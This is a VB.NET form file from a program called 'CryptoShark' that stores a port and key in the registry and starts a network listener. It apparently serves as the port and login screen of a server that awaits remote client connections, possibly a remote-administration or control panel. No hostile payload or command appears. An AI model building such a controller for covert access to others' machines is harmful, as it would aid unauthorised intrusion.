Imports System.ComponentModel
Imports System.IO
Imports System.Threading
Imports Microsoft.VisualBasic.CompilerServices
Imports Microsoft.Win32

Public Class FrmPort
    Public Sub New()
        InitializeComponent()
        Me.Opacity = 0
        FadeIn(Me, 20)
    End Sub


    Public Async Sub connect()
        Try
            Await Task.Delay(2000)
            form1.S = New Server
            Dim listener As New Threading.Thread(New Threading.ParameterizedThreadStart(AddressOf form1.S.Start))
            listener.Start(Gclass1.Port)
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub
    Private Sub Port_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
        Application.Exit()
    End Sub

    Public validchars As String = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
    Public Shared rand As New Random()

    Private Sub Port_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Try
            Dim regKey As RegistryKey
            regKey = My.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE", True)
            regKey.CreateSubKey("CryptoShark")
            regKey.Close()
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
        Try
            tlscclient.BeginConnect()
            If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\CryptoShark", "Port", Nothing) = Nothing Then
                TextBox1.Text = "9049"
            Else
                TextBox1.Text = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\CryptoShark", "Port", Nothing)
            End If
            If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\CryptoShark", "Key", Nothing) = Nothing Then
                TextBox2.Text = "<agent>"
            Else
                TextBox2.Text = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\CryptoShark", "Key", Nothing)
            End If
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub TextBox1_KeyDown(sender As Object, e As KeyEventArgs)
        If e.KeyCode = Keys.Enter Then
            e.SuppressKeyPress = True

            If Me.Button2.Enabled = True Then
                Me.Button2.PerformClick()
            End If
        End If

    End Sub

    Private Sub TextBox1_TextChanged(sender As Object, e As EventArgs)
        Try
            Dim num As Integer = Conversions.ToInteger(Me.TextBox1.Text)
            If ((Conversions.ToInteger(Me.TextBox1.Text) > &HFFFE) Or (Conversions.ToInteger(Me.TextBox1.Text) < 1)) Then
                Me.Button2.Enabled = False
            Else
                Me.Button2.Enabled = True
            End If
        Catch exception1 As Exception
            Me.Button2.Enabled = False
        End Try
    End Sub

    Private Sub TextBox2_KeyDown(sender As Object, e As KeyEventArgs)
        If e.KeyCode = Keys.Enter Then
            e.SuppressKeyPress = True

            If Me.Button2.Enabled = True Then
                Me.Button2.PerformClick()
            End If
        End If
    End Sub

    Private Sub TextBox2_TextChanged(sender As Object, e As EventArgs)
        Try
            If Me.TextBox2.Text.Length > 32 Or ((Me.TextBox2.Text.Length) < 1) Then
                Me.Button2.Enabled = False
            Else
                Me.Button2.Enabled = True
            End If
        Catch ex As Exception
            Me.Button2.Enabled = False
        End Try
    End Sub


    Private Sub CheckBox1_KeyDown(sender As Object, e As KeyEventArgs)
        If e.KeyCode = Keys.Enter Then
            e.SuppressKeyPress = True

            If Me.Button2.Enabled = True Then
                Me.Button2.PerformClick()
            End If
        End If
    End Sub


    Private Sub TextBox4_KeyDown(sender As Object, e As KeyEventArgs)
        If e.KeyCode = Keys.Enter Then
            e.SuppressKeyPress = True

            If Me.Button2.Enabled = True Then
                Me.Button2.PerformClick()
            End If
        End If
    End Sub

    Private Sub TextBox3_KeyDown(sender As Object, e As KeyEventArgs)
        If e.KeyCode = Keys.Enter Then
            e.SuppressKeyPress = True

            If Me.Button2.Enabled = True Then
                Me.Button2.PerformClick()
            End If
        End If
    End Sub

    Private Sub TextBox5_TextChanged(sender As Object, e As EventArgs)

    End Sub

    Private Sub TextBox5_KeyDown(sender As Object, e As KeyEventArgs)
        If e.KeyCode = Keys.Enter Then
            e.SuppressKeyPress = True

            If Me.Button2.Enabled = True Then
                Me.Button2.PerformClick()
            End If
        End If
    End Sub

    Private Sub LoginBtn_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Class11.floar2()
    End Sub
End Class